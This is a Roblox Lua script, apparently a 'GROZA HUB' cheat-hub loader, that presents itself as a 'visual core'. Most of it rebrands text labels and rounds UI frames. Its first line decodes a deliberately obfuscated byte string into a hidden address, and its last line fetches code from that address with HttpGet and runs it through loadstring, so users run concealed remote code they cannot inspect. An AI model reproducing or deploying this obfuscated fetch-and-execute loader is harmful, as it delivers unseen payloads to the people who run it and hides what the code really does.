
--[[ STAGE 2: VISUAL CORE ]]
local A7jV3tZoferdvk="\010\004\035\107\041\043\098\101\063\114\118\080\048\092\096\087\094\126\072\090\133\124\119\134\164\147\180\130\165\188\175\204\161\174\214\207\214\232\251\001\002\234\228\004\031\255\252\250\014\031\132\075\074\072\090\162\103\109\102\098\124\122\134\119\141\222\155\142\177\168\186\184\198\192\213\218\225\038\234\242\236\063\235\011\006\253\029\034\028\019\042\030\038\059\050\077\063\088\092\171\088\104\097\194\200\187\120\125\135\141\167"local nHQJySPWUTO9VKgC6LQ=81 local Jio3j2hEb69klq4X2Rqi7=201 local mW57ALK5dox2W=0 local MrgKAxz8crdrH=6 local m21cNZn54MAafl=11 local a33F1_3tmhRIo2wq2=true local zvVkHLhZH2v8ay=bit32 and bit32.bxor if not zvVkHLhZH2v8ay then zvVkHLhZH2v8ay=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local V6oDVy3M7Vb0EaG9Yb={}for pYEDhQNFH5SiFJzjOAOpFS=1,#A7jV3tZoferdvk do local OorH_J4ZCpzhB7lgh0Y=string.byte(A7jV3tZoferdvk,pYEDhQNFH5SiFJzjOAOpFS)local FhRHeE6eq4S2NUFrhrj0s1=(Jio3j2hEb69klq4X2Rqi7+(pYEDhQNFH5SiFJzjOAOpFS*MrgKAxz8crdrH)+m21cNZn54MAafl)%256 if mW57ALK5dox2W==0 then OorH_J4ZCpzhB7lgh0Y=(OorH_J4ZCpzhB7lgh0Y-FhRHeE6eq4S2NUFrhrj0s1)%256 V6oDVy3M7Vb0EaG9Yb[pYEDhQNFH5SiFJzjOAOpFS]=string.char(zvVkHLhZH2v8ay(OorH_J4ZCpzhB7lgh0Y,nHQJySPWUTO9VKgC6LQ))else OorH_J4ZCpzhB7lgh0Y=zvVkHLhZH2v8ay(OorH_J4ZCpzhB7lgh0Y,nHQJySPWUTO9VKgC6LQ)V6oDVy3M7Vb0EaG9Yb[pYEDhQNFH5SiFJzjOAOpFS]=string.char((OorH_J4ZCpzhB7lgh0Y-FhRHeE6eq4S2NUFrhrj0s1)%256)end end local GDGIvoSPOZFeUeKISDL=table.concat(V6oDVy3M7Vb0EaG9Yb)if a33F1_3tmhRIo2wq2 then GDGIvoSPOZFeUeKISDL=string.reverse(GDGIvoSPOZFeUeKISDL)end local zMRBll8cokIASh=GDGIvoSPOZFeUeKISDL
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(zMRBll8cokIASh))()
